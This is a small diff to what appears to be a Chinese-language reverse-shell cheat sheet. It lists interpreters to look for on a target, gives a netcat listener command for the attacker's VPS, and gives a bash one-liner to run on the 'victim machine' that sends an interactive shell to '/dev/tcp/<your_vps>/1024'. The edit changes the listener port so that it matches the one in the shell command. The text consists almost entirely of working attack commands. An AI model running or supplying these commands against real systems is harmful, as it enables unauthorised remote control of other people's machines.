@@ -4,7 +4,7 @@
 whereis bash nc python php exec perl ruby telnet
 
 用bash反弹shell：
-VPS上执行：nc -n -v -lp 3636
+VPS上执行：nc -n -v -lp 1024
 受害机上执行：/bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1
 
 用exec反弹shell：
